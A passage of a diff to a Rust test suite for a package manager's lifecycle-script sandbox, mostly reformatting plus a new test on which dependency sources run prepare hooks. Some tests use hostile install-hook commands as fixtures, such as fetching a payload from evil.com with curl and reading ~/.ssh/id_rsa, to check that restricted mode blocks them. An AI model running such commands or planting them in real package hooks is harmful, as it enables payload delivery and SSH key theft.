+    let err = policy
+        .check_execution_allowed("unapproved-pkg", "node build.js")
+        .unwrap_err();
     assert!(matches!(err, LifecycleError::PackageNotAllowlisted(ref p) if p == "unapproved-pkg"));
 
     // 2. Strict mode requires allowlisting
     let strict = ScriptSandboxPolicy::strict().allow_package("core-lib");
-    assert!(strict.check_execution_allowed("core-lib", "node build.js").is_ok());
-    let err_strict = strict.check_execution_allowed("other-lib", "node build.js").unwrap_err();
+    assert!(strict
+        .check_execution_allowed("core-lib", "node build.js")
+        .is_ok());
+    let err_strict = strict
+        .check_execution_allowed("other-lib", "node build.js")
+        .unwrap_err();
     assert!(matches!(err_strict, LifecycleError::PackageNotAllowlisted(ref p) if p == "other-lib"));
 }
 
@@ -1607,11 +1809,15 @@ fn test_sandbox_execution_cancellation_sync() {
         "malicious-curl-pkg",
         "postinstall",
         "curl http://evil.com/payload.sh",
-    ).with_sandbox_policy(ScriptSandboxPolicy::restricted());
+    )
+    .with_sandbox_policy(ScriptSandboxPolicy::restricted());
 
     // In restricted sandbox, must fail and cancel execution before spawning process
     let res = execute_lifecycle_script(&ctx);
-    assert!(res.is_err(), "Dangerous script must fail synchronously before spawn in restricted sandbox");
+    assert!(
+        res.is_err(),
+        "Dangerous script must fail synchronously before spawn in restricted sandbox"
+    );
     let err_str = res.unwrap_err().to_string();
     assert!(err_str.contains("Dangerous command pattern detected"));
     assert!(err_str.contains("curl"));
@@ -1628,11 +1834,15 @@ async fn test_sandbox_execution_cancellation_async() {
         "malicious-ssh-pkg",
         "preinstall",
         "cat ~/.ssh/id_rsa",
-    ).with_sandbox_policy(ScriptSandboxPolicy::restricted());
+    )
+    .with_sandbox_policy(ScriptSandboxPolicy::restricted());
 
     // In restricted sandbox, must fail and cancel async execution
     let res = execute_lifecycle_script_async(&ctx).await;
-    assert!(res.is_err(), "Dangerous script must fail asynchronously before spawn in restricted sandbox");
+    assert!(
+        res.is_err(),
+        "Dangerous script must fail asynchronously before spawn in restricted sandbox"
+    );
     let err_str = res.unwrap_err().to_string();
     assert!(err_str.contains("Dangerous command pattern detected"));
     assert!(err_str.contains("~/.ssh"));
@@ -1660,7 +1870,9 @@ fn test_default_policy_permissive_npm_parity_allows_native_builds() {
 
     for cmd in native_commands {
         assert!(
-            default_policy.check_execution_allowed("native-addon-pkg", cmd).is_ok(),
+            default_policy
+                .check_execution_allowed("native-addon-pkg", cmd)
+                .is_ok(),
             "Default permissive policy should allow native build command: '{cmd}'"
         );
     }
@@ -1673,12 +1885,20 @@ fn test_opt_in_strict_sandbox_policy_enforcement() {
     assert!(strict_policy.level.is_restricted());
 
     // Standard native builds without dangerous patterns are still permitted
-    assert!(strict_policy.check_execution_allowed("native-pkg", "node-gyp rebuild").is_ok());
-    assert!(strict_policy.check_execution_allowed("native-pkg", "cmake --build .").is_ok());
+    assert!(strict_policy
+        .check_execution_allowed("native-pkg", "node-gyp rebuild")
+        .is_ok());
+    assert!(strict_policy
+        .check_execution_allowed("native-pkg", "cmake --build .")
+        .is_ok());
 
     // But dangerous network / sensitive patterns are blocked in restricted mode
-    assert!(strict_policy.check_execution_allowed("bad-pkg", "curl http://evil.com").is_err());
-    assert!(strict_policy.check_execution_allowed("bad-pkg", "cat ~/.ssh/id_rsa").is_err());
+    assert!(strict_policy
+        .check_execution_allowed("bad-pkg", "curl http://evil.com")
+        .is_err());
+    assert!(strict_policy
+        .check_execution_allowed("bad-pkg", "cat ~/.ssh/id_rsa")
+        .is_err());
 }
 
 #[test]
@@ -1708,7 +1928,9 @@ async fn test_workspace_script_hook_sequencing_pre_main_post() {
     manifest_a.version = Some("1.0.0".to_string());
     manifest_a.scripts.insert(
         "prebuild".to_string(),
-        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-a:prebuild\\n')\""),
+        format!(
+            "node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-a:prebuild\\n')\""
+        ),
     );
     manifest_a.scripts.insert(
         "build".to_string(),
@@ -1716,16 +1938,22 @@ async fn test_workspace_script_hook_sequencing_pre_main_post() {
     );
     manifest_a.scripts.insert(
         "postbuild".to_string(),
-        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-a:postbuild\\n')\""),
+        format!(
+            "node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-a:postbuild\\n')\""
+        ),
     );
 
     let mut manifest_b = Manifest::default();
     manifest_b.name = Some("pkg-b".to_string());
     manifest_b.version = Some("1.0.0".to_string());
-    manifest_b.dependencies.insert("pkg-a".to_string(), "1.0.0".to_string());
+    manifest_b
+        .dependencies
+        .insert("pkg-a".to_string(), "1.0.0".to_string());
     manifest_b.scripts.insert(
         "prebuild".to_string(),
-        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-b:prebuild\\n')\""),
+        format!(
+            "node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-b:prebuild\\n')\""
+        ),
     );
     manifest_b.scripts.insert(
         "build".to_string(),
@@ -1733,7 +1961,9 @@ async fn test_workspace_script_hook_sequencing_pre_main_post() {
     );
     manifest_b.scripts.insert(
         "postbuild".to_string(),
-        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-b:postbuild\\n')\""),
+        format!(
+            "node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-b:postbuild\\n')\""
+        ),
     );
 
     let members = vec![
@@ -1796,14 +2026,19 @@ async fn test_workspace_script_pre_hook_failure_halts_execution() {
     let mut manifest_1 = Manifest::default();
     manifest_1.name = Some("pkg-1".to_string());
     manifest_1.version = Some("1.0.0".to_string());
-    manifest_1.scripts.insert("pretest".to_string(), "node -e \"process.exit(42)\"".to_string());
+    manifest_1.scripts.insert(
+        "pretest".to_string(),
+        "node -e \"process.exit(42)\"".to_string(),
+    );
     manifest_1.scripts.insert(
         "test".to_string(),
         format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-1:test\\n')\""),
     );
     manifest_1.scripts.insert(
         "posttest".to_string(),
-        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-1:posttest\\n')\""),
+        format!(
+            "node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-1:posttest\\n')\""
+        ),
     );
 
     let mut manifest_2 = Manifest::default();
@@ -1837,14 +2072,23 @@ async fn test_workspace_script_pre_hook_failure_halts_execution() {
         filter_members: None,
     };
 
-    let res = execute_workspace_scripts_topological(root, &members, &["pkg-1".to_string(), "pkg-2".to_string()], &opts).await;
+    let res = execute_workspace_scripts_topological(
+        root,
+        &members,
+        &["pkg-1".to_string(), "pkg-2".to_string()],
+        &opts,
+    )
+    .await;
     assert!(res.is_err(), "Execution must fail when pre-hook fails");
 
     let err = res.unwrap_err();
     let exit_code = extract_error_exit_code(&err);
     assert_eq!(exit_code, 42, "Exit code must match the failed pre-hook");
 
-    assert!(!marker_file.exists(), "No downstream scripts should have executed after pre-hook failure");
+    assert!(
+        !marker_file.exists(),
+        "No downstream scripts should have executed after pre-hook failure"
+    );
 }
 
 #[tokio::test]
@@ -1865,7 +2109,10 @@ async fn test_workspace_script_main_failure_prevents_post_hook() {
         "prebuild".to_string(),
         format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'prebuild\\n')\""),
     );
-    manifest.scripts.insert("build".to_string(), "node -e \"process.exit(17)\"".to_string());
+    manifest.scripts.insert(
+        "build".to_string(),
+        "node -e \"process.exit(17)\"".to_string(),
+    );
     manifest.scripts.insert(
         "postbuild".to_string(),
         format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'postbuild\\n')\""),
@@ -1896,7 +2143,88 @@ async fn test_workspace_script_main_failure_prevents_post_hook() {
 
     let content = std::fs::read_to_string(&marker_file).unwrap();
     let lines: Vec<&str> = content.lines().collect();
-    assert_eq!(lines, vec!["prebuild"], "Only prebuild should run before failure; postbuild must be skipped");
+    assert_eq!(
+        lines,
+        vec!["prebuild"],
+        "Only prebuild should run before failure; postbuild must be skipped"
+    );
+}
+
+#[tokio::test]
+async fn test_package_source_prepare_hook_behavior() {
+    let temp = tempfile::tempdir().unwrap();
+    let root = temp.path();
+
+    let marker_file = root.join("prepare_hooks.txt");
+    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");
+
+    let sources = [
+        ("registry-dep", PackageSource::Registry, false),
+        ("local-dep", PackageSource::Local, true),
+        ("git-dep", PackageSource::Git, true),
+        ("tarball-dep", PackageSource::LocalTarball, true),
+    ];
+
+    let mut nodes = Vec::new();
+    for (name, source, _should_run_prepare) in &sources {
+        let pkg_dir = root.join("node_modules").join(name);
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+
+        let mut manifest = Manifest::default();
+        manifest.name = Some(name.to_string());
+        manifest.version = Some("1.0.0".to_string());
+        manifest.scripts.insert(
+            "prepare".to_string(),
+            format!(
+                "node -e \"require('fs').appendFileSync('{escaped_marker}', '{name}:prepare\\n')\""
+            ),
+        );
+
+        nodes.push(LifecyclePackageNode {
+            package_path: format!("node_modules/{name}"),
+            disk_path: pkg_dir,
+            manifest,
+            source: *source,
+            dependencies: vec![],
+            optional: false,
+        });
+    }
+
+    let root_manifest = Manifest::default();
+    let opts = LifecycleOptions::new(root);
+
+    let res = execute_topological(&nodes, &root_manifest, &opts).await;
+    assert!(
+        res.is_ok(),
+        "Lifecycle topological execution should succeed"
+    );
+
+    let marker_content = if marker_file.exists() {
+        std::fs::read_to_string(&marker_file).unwrap()
+    } else {
+        String::new()
+    };
+    let ran_lines: Vec<&str> = marker_content.lines().collect();
+
+    // Registry dep should NOT run prepare
+    assert!(
+        !ran_lines.contains(&"registry-dep:prepare"),
+        "Registry dependency MUST NOT run prepare"
+    );
+
+    // Local, Git, LocalTarball MUST run prepare
+    assert!(
+        ran_lines.contains(&"local-dep:prepare"),
+        "Local dependency MUST run prepare"
+    );
+    assert!(
+        ran_lines.contains(&"git-dep:prepare"),
+        "Git dependency MUST run prepare"
+    );
+    assert!(
+        ran_lines.contains(&"tarball-dep:prepare"),
+        "LocalTarball dependency MUST run prepare"
+    );
 }
 
 #[tokio::test]
@@ -1942,7 +2270,8 @@ async fn test_workspace_script_missing_hooks_safely_skipped() {
     std::fs::create_dir_all(&p4_dir).unwrap();
     let mut m4 = Manifest::default();
     m4.name = Some("pkg-none".to_string());
-    m4.scripts.insert("unrelated".to_string(), "echo nothing".to_string());
+    m4.scripts
+        .insert("unrelated".to_string(), "echo nothing".to_string());
 
     let members = vec![
         WorkspaceScriptMember {
@@ -2024,7 +2353,9 @@ async fn test_workspace_topological_order_execution_dependencies_before_dependen
 
     let mut m_auth = Manifest::default();
     m_auth.name = Some("auth-service".to_string());
-    m_auth.dependencies.insert("core-db".to_string(), "workspace:*".to_string());
+    m_auth
+        .dependencies
+        .insert("core-db".to_string(), "workspace:*".to_string());
     m_auth.scripts.insert(
         "build".to_string(),
         format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'auth-service\\n')\""),
@@ -2032,8 +2363,10 @@ async fn test_workspace_topological_order_execution_dependencies_before_dependen
 
     let mut m_gw = Manifest::default();
     m_gw.name = Some("api-gateway".to_string());
-    m_gw.dependencies.insert("auth-service".to_string(), "workspace:*".to_string());
-    m_gw.dev_dependencies.insert("core-db".to_string(), "workspace:*".to_string());
+    m_gw.dependencies
+        .insert("auth-service".to_string(), "workspace:*".to_string());
+    m_gw.dev_dependencies
+        .insert("core-db".to_string(), "workspace:*".to_string());
     m_gw.scripts.insert(
         "build".to_string(),
         format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'api-gateway\\n')\""),
@@ -2041,7 +2374,9 @@ async fn test_workspace_topological_order_execution_dependencies_before_dependen
 
     let mut m_front = Manifest::default();
     m_front.name = Some("frontend-app".to_string());
-    m_front.dependencies.insert("api-gateway".to_string(), "workspace:*".to_string());
+    m_front
+        .dependencies
+        .insert("api-gateway".to_string(), "workspace:*".to_string());
     m_front.scripts.insert(
         "build".to_string(),
         format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'frontend-app\\n')\""),
